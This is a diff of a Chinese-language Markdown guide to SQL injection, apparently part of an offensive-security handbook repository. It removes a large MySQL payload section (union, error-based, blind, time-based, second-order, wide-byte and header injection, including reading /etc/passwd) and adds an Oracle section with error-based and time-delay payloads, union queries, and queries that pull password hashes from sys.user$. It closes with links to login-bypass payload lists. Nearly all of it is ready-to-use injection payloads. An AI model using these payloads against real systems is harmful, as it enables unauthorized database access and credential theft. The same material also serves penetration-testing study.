@@ -159,168 +159,97 @@ PostgreSQL识别：
 
 ## 3.注入类型
 
-（1）MySQL注入
+(1) MySQL注入
 
-联合注入：
-```sql
-select user,password from users where user_id=1 union select 1,2;
-select * from users where user_id = 1 union select * from users where user_id = 2 ;
-字符型注入dvwa
-1' or '1234'=1234
-1' or 'abcd' = 'abcd'
-1' or 1=1 order by 1 //猜测字段
-select * from users order by password ;
-1' or 1=1 order by 2 #
-1' or 1=1 order by 3 #
-1' union select 1,database() #
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() //获取数据库中的表
-select group_concat(user) from users where user_id=1 or user_id=2;
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' //获取表字段名
-1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users
-{
-id=-1 union select 1,2,3,database(),5,6,7,8
-(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),5,6,7,8
-(select column_name from information_schema.columns where table_schema='dvwa'  and table_name='users' limit 4,1)
-(select password from dvwa.users limit 0,1),(select user from dvwa.users limit 0,1)
-}
-```
+
+
+(2) Oracle
 
 报错注入：
 ```sql
-floor函数
-1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
-select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
-and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆数据库
-and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) //爆表
-and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆字段
-and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_id,0x3a,password,0x23) FROM user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆内容
+1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual)) -- //获取主机名
+SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual
 
-UPDATEXML函数
-1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
-(0x7e,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),0x7e)
-' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+
+1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1)) -- //全文检索并返回语句执行结果
+SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual
 
-几何函数报错
-1' and geometrycollection((select * from(select * from(select user())a)b));
-1' and multipoint((select * from(select * from(select user())a)b));
-1' and polygon((select * from(select * from(select user())a)b));
-1' and multipolygon((select * from(select * from(select user())a)b));
-1' and linestring((select * from(select * from(select user())a)b));
-1' and multilinestring((select * from(select * from(select user())a)b));
+1' AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual) IS NOT NULL -- //将字符串转换为XML类型
+SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual
+SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users
 
-exp
-1' and exp(~(select * from(select user())a));
-select ~0 //将0取反，函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。
-MySql5.5.5版本后整形溢出才会报错
-得到表名：
-select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
-得到列名：
-select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
-检索数据：
-select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
-insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0 or '', 'Eyre');
-select exp(~(select*from(select load_file('/etc/passwd'))a));读取本地文件
-insert into users (id, username, password) values (2, '' or !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0 or '', 'Eyre');
-
-update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;
-
-delete from users where id='1' or !(select*from(select user())x)-~0 or '';
-
-Extractvalue
-?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
-
-NAME_CONST
-?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
-?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
-?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
+SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual
+SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual
+SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users
+SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))
+XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()
+XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()
 ```
 
 盲注：
 ```sql
-布尔
-1' and left(database(),4)='dvwa' --+
-1' and mid(database(),1,1)='d' --+
-1' and ascii(mid(database(),1,1))='100'--+
-1' and length(database())>=5--+判断库名长度
-1' and substr(database(),1,1)='d'--+ 截取库名第一个字符
-1 and 1=(if((user() regexp '^r'),1,0)) --+
-1 and 1=(user() like 'r%25') --+
+1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',10) -- //该函数用于从指定的管道中接收消息，如果没有消息，那么会等待一定的时间，直到超时或收到消息为止
+1' AND 1=DBMS_LOCK.SLEEP(10) -- //该函数用于让一个过程休眠一定的秒数，攻击者可以使用该函数来制造人为的延时
+1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) AND '1'=(SELECT CASE WHEN user='SYS' THEN '1' ELSE '0' END FROM dual) -- //从指定的管道中接收消息，如果没有消息，那么会等待一定的时间，直到超时或收到消息为止
+1' AND 1=(SELECT COUNT(*) FROM all_objects) -- //利用数据库中的一些操作，如查询大量的数据、进行复杂的计算等，来增加数据库的处理时间，从而影响网页的加载时间
+
+SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
+SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)
+SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);
+SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';
+SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';
+1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) --
+1' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)) --
+1' AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual) IS NOT NULL --
+
+1' AND 1=(SELECT 1/0 FROM dual) -- //利用数据库中的一些逻辑错误，如除以零、字符串转换为数字等，来触发数据库的错误信息
 ```
 
-延迟注入：
+联合注入：
 ```sql
-SLEEP函数
-1' and if(length(database())>=4,sleep(5),1)--+
-1' and if(ascii(mid(database(),1,1))='100',sleep(5),1)--+
-1 and (select sleep(10) from dual where database() like '%')#
-1 and (select sleep(10) from dual where database() like '___')#
-1 and (select sleep(10) from dual where database() like '_____')#
-1 and (select sleep(10) from dual where database() like 'a____')#
-1 and (select sleep(10) from dual where database() like 's____')#
-1 and (select sleep(10) from dual where database() like 'sa___')#
-1 and (select sleep(10) from dual where database() like 'swa__')#
-1 and (select sleep(10) from dual where database() like 'swb__')#
-1 and (select sleep(10) from dual where database() like 'swi__')#
-1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
-
-BENCHMARK
-Select * from users where user_id= 1 and (if(ascii(substr(database(),1,1))=100,benchmark(100000000,sha(1)), null));
-
-笛卡尔积
-将两个大表做乘积。现在，我们有两个集合A和B。
-A = {0,1}     B = {2,3,4}
-集合 A×B 和 B×A的结果集就可以分别表示为以下这种形式：
-A×B = {（0，2），（1，2），（0，3），（1，3），（0，4），（1，4）}；
-B×A = {（2，0），（2，1），（3，0），（3，1），（4，0），（4，1）}；
-数据库表连接数据行匹配时所遵循的算法就是以上提到的笛卡尔积，表与表之间的连接可以看成是在做乘法运算
-select * from guestbook join users
-
-Get_lock
-Select GET_LOCK('snowwolf',10)
-
-Rlike
-select concat (rpad (1,999999,a),rpad (1,999999,a),rpad(1,999999,a) ,rpad(1,999999,a)
-,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a)
-,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rp
-ad(1,999999,a) ,rpad (1,999999,a),rpad(1,999999,a),rpad(1,999999,a )) RLIKE '(a.*)+(a.*)+
-(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b';
+SELECT user FROM dual UNION SELECT * FROM v$version
+SELECT user FROM dual UNION (SELECT * FROM v$version)
+SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)
 ```
 
-堆叠查询：
+查询语句：
 ```sql
-;select
-```
+查看版本
+SELECT user FROM dual UNION SELECT * FROM v$version
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
+SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
+SELECT version FROM v$instance;
 
-二阶注入：
-```sql
-注册或更新个人资料如下
-I love programming', email=(SELECT email FROM users WHERE username='admin') --
-当执行SQL语句时，会发生以下情况：
-末尾的注释--可确保原始 SQL 查询的其余部分被注释掉
-子查询(SELECT email FROM users WHERE username='admin'）将执行用管理员用户的电子邮件替换该列
-```
+查看主机名
+SELECT host_name FROM v$instance; (Privileged)
+SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
+SELECT UTL_INADDR.get_host_address FROM dual;
 
-宽字节注入：
-```sql
-%bf%27
-%df%5c
-%A8%27
-```
+数据库名称
+SELECT global_name FROM global_name;
+SELECT name FROM V$DATABASE;
+SELECT instance_name FROM V$INSTANCE;
+SELECT SYS.DATABASE_NAME FROM DUAL;
 
-HTTP请求头注入：
-```sql
-User-Agent
-Cookie
-Referer
-X-Forward-For
+数据库凭据
+SELECT username FROM all_users;
+SELECT name, password from sys.user$;
+SELECT name, spare4 from sys.user$;
+
+列出数据库
+SELECT DISTINCT owner FROM all_tables;
+列：
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
+表：
+SELECT table_name FROM all_tables;
+SELECT owner, table_name FROM all_tables;
+SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 ```
 
 ## 4.身份验证绕过
 
 Payload:
+
 [login_bypass](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass.txt)<br>
-[login_bypass2](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass2.txt)
+[login_bypass2](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass2.txt)<br>
